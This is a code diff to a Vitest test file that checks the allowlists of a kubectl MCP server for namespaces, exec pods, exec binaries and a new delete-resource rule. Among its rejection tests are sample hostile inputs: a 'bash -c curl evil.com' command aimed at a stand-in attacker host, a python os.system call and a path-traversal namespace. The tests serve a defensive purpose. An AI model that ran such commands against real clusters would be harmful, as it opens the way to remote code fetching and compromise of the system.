@@ -7,13 +7,18 @@
  */
 import { describe, it, expect } from 'vitest';
 
-// The validation functions are not exported from kubectl-server.ts (they're
-// module-private). We replicate the logic here to test the rules independently.
-// If the allowlists change in kubectl-server.ts, update these tests to match.
+// Replicate the validation logic and allowlists from kubectl-server.ts.
+// If the allowlists change there, update these tests to match.
 
-const ALLOWED_NAMESPACES = ['kube-system'];
+const ALLOWED_NAMESPACES = [
+  'kube-system',
+  'arc-systems',
+  'buildkit',
+  'harbor',
+];
 const ALLOWED_EXEC_POD_PATTERNS = [/^etcd-/];
 const ALLOWED_EXEC_BINARIES = ['etcdctl'];
+const ALLOWED_DELETE_RESOURCES = ['pods'];
 
 function validateNamespace(namespace: string): void {
   if (!ALLOWED_NAMESPACES.includes(namespace)) {
@@ -40,12 +45,28 @@ function validateExecBinary(command: string[]): void {
   }
 }
 
-describe('kubectl MCP server validation', () => {
-  // --- Namespace validation ---
+function validateDeleteResource(resource: string): void {
+  if (!ALLOWED_DELETE_RESOURCES.includes(resource)) {
+    throw new Error(`Resource "${resource}" not allowed for deletion.`);
+  }
+}
 
+describe('kubectl MCP server validation', () => {
   describe('validateNamespace', () => {
     it('allows kube-system', () => {
       expect(() => validateNamespace('kube-system')).not.toThrow();
+    });
+
+    it('allows arc-systems', () => {
+      expect(() => validateNamespace('arc-systems')).not.toThrow();
+    });
+
+    it('allows buildkit', () => {
+      expect(() => validateNamespace('buildkit')).not.toThrow();
+    });
+
+    it('allows harbor', () => {
+      expect(() => validateNamespace('harbor')).not.toThrow();
     });
 
     it('rejects default namespace', () => {
@@ -64,8 +85,6 @@ describe('kubectl MCP server validation', () => {
       expect(() => validateNamespace('../kube-system')).toThrow('not allowed');
     });
   });
-
-  // --- Pod pattern validation (for exec) ---
 
   describe('validateExecPod', () => {
     it('allows etcd-f06cs15', () => {
@@ -95,8 +114,6 @@ describe('kubectl MCP server validation', () => {
     });
   });
 
-  // --- Binary validation (for exec) ---
-
   describe('validateExecBinary', () => {
     it('allows etcdctl', () => {
       expect(() =>
@@ -116,9 +133,9 @@ describe('kubectl MCP server validation', () => {
     });
 
     it('rejects bash', () => {
-      expect(() => validateExecBinary(['bash', '-c', 'curl evil.com'])).toThrow(
-        'not allowed',
-      );
+      expect(() =>
+        validateExecBinary(['bash', '-c', 'curl evil.com']),
+      ).toThrow('not allowed');
     });
 
     it('rejects sh', () => {
@@ -141,6 +158,42 @@ describe('kubectl MCP server validation', () => {
       expect(() =>
         validateExecBinary(['python3', '-c', 'import os; os.system("id")']),
       ).toThrow('not allowed');
+    });
+  });
+
+  describe('validateDeleteResource', () => {
+    it('allows pods', () => {
+      expect(() => validateDeleteResource('pods')).not.toThrow();
+    });
+
+    it('rejects deployments', () => {
+      expect(() => validateDeleteResource('deployments')).toThrow(
+        'not allowed',
+      );
+    });
+
+    it('rejects services', () => {
+      expect(() => validateDeleteResource('services')).toThrow('not allowed');
+    });
+
+    it('rejects secrets', () => {
+      expect(() => validateDeleteResource('secrets')).toThrow('not allowed');
+    });
+
+    it('rejects configmaps', () => {
+      expect(() => validateDeleteResource('configmaps')).toThrow('not allowed');
+    });
+
+    it('rejects namespaces', () => {
+      expect(() => validateDeleteResource('namespaces')).toThrow('not allowed');
+    });
+
+    it('rejects nodes', () => {
+      expect(() => validateDeleteResource('nodes')).toThrow('not allowed');
+    });
+
+    it('rejects empty string', () => {
+      expect(() => validateDeleteResource('')).toThrow('not allowed');
     });
   });
 });
